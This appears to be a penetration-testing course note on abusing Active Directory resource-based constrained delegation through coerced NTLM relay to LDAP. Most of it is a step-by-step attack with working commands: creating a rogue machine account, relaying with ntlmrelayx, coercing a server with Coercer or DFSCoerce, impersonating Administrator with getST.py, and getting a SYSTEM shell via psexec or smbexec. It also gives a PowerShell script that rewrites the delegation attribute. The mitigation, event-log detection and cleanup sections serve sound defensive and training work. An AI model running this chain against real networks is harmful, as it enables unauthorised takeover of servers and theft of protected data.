---
tags: [active-directory, coercion, relay, vapt]
difficulty: expert
module: "64 - Advanced Coercion and Relay Attacks"
topic: "64.10 Resource-Based Constrained Delegation RBCD via Relay"
---

# 10 - Resource-Based Constrained Delegation RBCD via Relay

## 1. Introduction to RBCD via Relay

Resource-Based Constrained Delegation (RBCD) is an Active Directory feature introduced in Windows Server 2012. Unlike traditional constrained delegation (which is configured on the front-end service and requires Domain Admin privileges), RBCD is configured on the **target resource** (the back-end service). 

The critical security implication of RBCD is that the owner of a computer account (or anyone with write access to it) can configure who is allowed to delegate authentication to it. This configuration is stored in the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute of the target's AD object.

When combined with NTLM Relaying, RBCD creates a devastating, highly reliable attack chain. If an attacker can force a target machine to authenticate to them (via Coercion) and relay that authentication to LDAP, they act in the context of the target machine itself. Because a machine account naturally has write privileges over its own attributes, the attacker can write to the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute, granting an attacker-controlled machine account the right to impersonate any user on the target.

## 2. Architectural Flow & ASCII Diagram

```text
  +-----------------------+                            +-----------------------+
  |    Target Server      |                            |   Domain Controller   |
  |  (e.g., File Server)  |                            |   (LDAP Port 389)     |
  +-----------+-----------+                            +-----------+-----------+
              |                                                    ^
              | 2. Coerced Auth via MS-EFSR                        |
              V                                                    |
  +-----------+-----------+                                        |
  |    Attacker Node      |  3. Relay NTLM to LDAP (as Target$)    |
  |  (ntlmrelayx.py)      |========================================+
  +-----------+-----------+                                        |
              |                                                    |
              | 1. Create Fake Computer Account (AttackerPC$)      |
              |--------------------------------------------------->|
              |                                                    |
              | 4. Modify Target$'s msDS-AllowedTo... attribute    |
              |    (Points back to AttackerPC$)                    |
              |--------------------------------------------------->|
              |                                                    |
              | 5. S4U2Self: AttackerPC$ gets Service Ticket       |
              |    for "Administrator" to itself                   |
              |--------------------------------------------------->|
              |                                                    |
              | 6. S4U2Proxy: AttackerPC$ swaps ticket for         |
              |    "Administrator" to Target Server (CIFS)         |
              |--------------------------------------------------->|
              |                                                    |
              V                                                    |
      [ FULL COMPROMISE OF TARGET SERVER VIA PASSTHETICKET ]
```

## 3. Pre-Requisites for the Attack

To execute the RBCD relay attack, three specific conditions must be met:

1. **LDAP Signing must not be strictly enforced**, OR **LDAP Channel Binding (EPA) must not be enforced on LDAPS.** If LDAP Signing is enforced, the relay to port 389 will fail. If EPA is not enforced, the attacker can relay to LDAPS (port 636) to bypass the signing requirement.
2. **MachineAccountQuota (MAQ) > 0.** The attacker needs an AD account with an SPN to perform the S4U Kerberos extensions. The easiest way to get this is to create a new machine account. By default, any authenticated user in AD can create up to 10 machine accounts (`ms-DS-MachineAccountQuota=10`).
3. **The Target must be coercible.** The target server must have an RPC service (like Spooler, EFS) exposed or be susceptible to WebDAV coercion, and it must be able to reach the attacker's IP over SMB or HTTP.

## 4. Step-by-Step Execution Guide

This attack requires a combination of `Impacket`, a coercion tool, and `Rubeus` (or `Impacket`'s `getST.py`).

### Step 1: Create the Attacker Machine Account
Use `addcomputer.py` (or let `ntlmrelayx` do it automatically). Assuming we have a low-privileged user `jdoe:Password123`:
```bash
addcomputer.py domain.local/jdoe:Password123 -dc-ip 10.10.10.10 -computer-name ATTACKER_PC$ -computer-pass 'Winter2026!'
```

### Step 2: Set up the Relay
Start `ntlmrelayx` to target the Domain Controller's LDAP (or LDAPS) service. Use the `--delegate-access` flag to automatically perform the RBCD attribute modification.
```bash
ntlmrelayx.py -t ldaps://10.10.10.10 -smb2support --delegate-access
```

### Step 3: Coerce the Target
Use `Coercer` to trigger the target server (`10.10.10.55`) to authenticate to your relay machine (`10.10.10.50`).
```bash
coercer coerce -u jdoe -p Password123 -d domain.local -t 10.10.10.55 -l 10.10.10.50
```
*Observe `ntlmrelayx` output. It will intercept `TARGET$`, relay to the DC, and append `ATTACKER_PC$` to the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute of `TARGET$`.*

### Step 4: S4U2Self and S4U2Proxy (Kerberos Delegation)
Now that `ATTACKER_PC$` is allowed to delegate to `TARGET$`, we use `getST.py` to impersonate `Administrator` on `TARGET$`.
- **S4U2Self:** Requests a Service Ticket for `Administrator` to `ATTACKER_PC$`.
- **S4U2Proxy:** Presents that ticket to the DC, requesting a Service Ticket for `Administrator` to `TARGET$` (specifically, the `cifs/TARGET_IP` service).

```bash
getST.py domain.local/ATTACKER_PC\$:Winter2026\! -spn cifs/target.domain.local -impersonate Administrator -dc-ip 10.10.10.10
```
This generates a `.ccache` file (e.g., `Administrator.ccache`).

### Step 5: Exploit (Pass the Ticket)
Load the ticket into your environment and execute commands via `psexec` or `smbexec`:
```bash
export KRB5CCNAME=Administrator.ccache
psexec.py -k -no-pass target.domain.local
```
You now have a `NT AUTHORITY\SYSTEM` shell on the target server.

## 5. Advanced Considerations: Target OS Restrictions

One complication arises depending on the OS of the target machine:
- For **Windows Server 2019 and newer**, the target requires the Kerberos ticket to have a valid PAC (Privilege Attribute Certificate) that proves the user is actually an administrator. 
- Due to MS fixes (like CVE-2020-17049, Bronze Bit), manipulating the delegation tickets has become more complex.
- However, `getST.py` natively implements the necessary workarounds (like the Forwardable flag modifications) to ensure the generated Service Ticket is accepted by modern Windows OSs.

## 6. Defensive Strategies and Mitigations

Defending against the RBCD relay attack requires breaking at least one link in the chain:

1. **Enforce LDAP Channel Binding and LDAP Signing:** This kills the relay step entirely. If the DC rejects unsigned LDAP traffic and enforces EPA on LDAPS, the attacker cannot modify the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute.
2. **Set MachineAccountQuota to 0:** This prevents standard domain users from creating the fake computer account needed for the Kerberos S4U operations. If MAQ is 0, the attacker must already possess an SPN-enabled account.
3. **Disable RPC Coercion Vectors:** Disable Print Spooler, EFS, and other vulnerable RPC services on high-value targets to prevent the initial authentication coercion.
4. **Account Sensitivity:** Mark sensitive administrative accounts (like Domain Admins) as "Account is sensitive and cannot be delegated". Even if RBCD is set up, the attacker cannot impersonate accounts with this flag enabled. Add sensitive accounts to the "Protected Users" group.

## Real-World Attack Scenario

An attacker breached a corporate network, securing access as a standard employee (`m.scott`) via a phishing payload. The attacker's goal was to compromise `FILESRV01`, a highly restricted file server containing financial data. Enumeration via BloodHound confirmed that `m.scott` had no administrative rights. However, the attacker noted that LDAP Signing was not strictly enforced on the Domain Controllers and the MachineAccountQuota (MAQ) was set to the default value of 10.

The attacker began by creating a fake computer account under their control using Impacket's `addcomputer.py`:
```bash
addcomputer.py corp.local/m.scott:Password123 -computer-name ATTACKER_PC$ -computer-pass 'Winter2026!'
```

Next, they set up `ntlmrelayx.py` to target the Domain Controller's LDAP service, utilizing the `--delegate-access` flag to automate the Resource-Based Constrained Delegation (RBCD) attack:
```bash
impacket-ntlmrelayx -t ldap://10.10.10.10 -smb2support --delegate-access
```

To force the target server to authenticate, the attacker used `DFSCoerce` against `FILESRV01`, triggering the DFS Namespace management RPC interface to connect back to the attacker's IP:
```bash
dfscoerce.py -u m.scott -p Password123 domain.local/10.10.10.50 10.10.10.55
```

`FILESRV01` authenticated to the attacker's machine over SMB. The relay tool forwarded this authentication to LDAP. Running in the context of `FILESRV01$`, `ntlmrelayx` modified the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute of `FILESRV01$`, adding `ATTACKER_PC$` to the descriptor. This explicitly allowed the attacker's fake machine account to delegate authentication to the file server.

With RBCD established, the attacker used `getST.py` to execute the S4U2Self and S4U2Proxy Kerberos extensions, requesting a Service Ticket impersonating the `Administrator` user specifically for the CIFS service on `FILESRV01`:
```bash
getST.py corp.local/ATTACKER_PC\$:Winter2026\! -spn cifs/filesrv01.corp.local -impersonate Administrator -dc-ip 10.10.10.10
```

The Domain Controller issued the ticket, which the attacker exported to their Kerberos credential cache. Using `smbexec.py -k -no-pass filesrv01.corp.local`, the attacker passed the ticket to obtain a `NT AUTHORITY\SYSTEM` shell on the file server, bypassing all local ACLs and accessing the restricted financial data.

## 7. Chaining Opportunities
- [[06 - Coercer - The Universal Coercion Toolkit]] – Initiates the attack flow.
- [[07 - NTLM Relay to LDAP - LDAP Signing Bypasses]] – The transportation method for the payload.
- [[16 - Kerberos Delegation Deep Dive]] – Understanding S4U2Self and S4U2Proxy.
- [[11 - Shadow Credentials Abuse]] – An alternative AD manipulation if RBCD is somehow blocked or heavily monitored.

## 8. Related Notes
- [[21 - Overpass-the-Hash and Pass-the-Ticket]]
- [[22 - Impacket Framework Deep Dive]]
- [[15 - Machine Account Quota MAQ Abuse]]

## 9. Manual RBCD Modification using PowerShell

While `ntlmrelayx.py` automates the RBCD attack via the `--delegate-access` flag, understanding how to manually configure the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute using PowerShell is vital for scenarios where the attacker already has compromised a user with write access to the target object.

The attribute requires a properly formatted Security Descriptor (SD). We cannot just insert a string or a raw SID.

```powershell
# 1. Import ActiveDirectory Module
Import-Module ActiveDirectory

# 2. Get the SID of the attacker-controlled machine account
$AttackerPC = Get-ADComputer -Identity "ATTACKER_PC$"
$AttackerSID = $AttackerPC.SID

# 3. Create a new raw Security Descriptor allowing the Attacker SID full access
$SDDL = "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$AttackerSID)"
$SecurityDescriptor = New-Object Security.AccessControl.RawSecurityDescriptor($SDDL)

# 4. Convert the Security Descriptor into a byte array
$SDBytes = New-Object byte[] ($SecurityDescriptor.BinaryLength)
$SecurityDescriptor.GetBinaryForm($SDBytes, 0)

# 5. Apply the byte array to the target server's attribute
Set-ADComputer -Identity "TARGET$" -Replace @{"msDS-AllowedToActOnBehalfOfOtherIdentity"=$SDBytes}
```

Once this is applied, the backend Kerberos mechanisms will permit the S4U2Proxy requests.

## 10. Event Log Forensics for RBCD

RBCD attacks leave highly specific and observable artifacts in the Windows Event Logs. Defensive teams and SOCs use these to detect and respond to the attack.

### 10.1. Machine Account Creation
Because the attack usually requires an SPN, attackers frequently create a new machine account.
- **Event ID 4741 (A computer account was created):** Alerting on computer accounts created by standard users (not IT admins) is a high-fidelity alert. The `SubjectUserName` will be the compromised low-privilege user.

### 10.2. LDAP Modification
When the relay occurs, the LDAP attribute is modified.
- **Event ID 5136 (A directory service object was modified):** This event is logged on the Domain Controller. The `LDAP Display Name` will be `msDS-AllowedToActOnBehalfOfOtherIdentity`. If this attribute is modified outside of an approved change management window, it is a critical alert.

### 10.3. Kerberos Anomalies
The S4U2Self and S4U2Proxy phases generate specific Kerberos logs on the DC.
- **Event ID 4769 (A Kerberos service ticket was requested):** During S4U2Self, the `Service Name` and `Target Name` will be the same (`ATTACKER_PC$`), but the `Account Name` (the user being impersonated) will be `Administrator`.
- **Event ID 4769 (again):** During S4U2Proxy, the `Service Name` is the target service (e.g., `TARGET$`), the `Account Name` is `Administrator`, and the `Transited Services` field will contain `ATTACKER_PC$`, explicitly showing the delegation path. Alerting on unexpected delegation paths (a random workstation delegating to a file server) is a strong detection metric.

## 11. Cleanup Post-Exploitation

A professional VAPT engagement requires leaving the target environment in the state it was found. Removing the RBCD configuration is crucial.
Using `ntlmrelayx.py`'s built-in cleanup or manually via PowerShell:
```powershell
Set-ADComputer -Identity "TARGET$" -Clear "msDS-AllowedToActOnBehalfOfOtherIdentity"
Remove-ADComputer -Identity "ATTACKER_PC$" -Confirm:$false
```
Failure to clean up leaves a permanent backdoor on the target system that could be leveraged by actual threat actors.
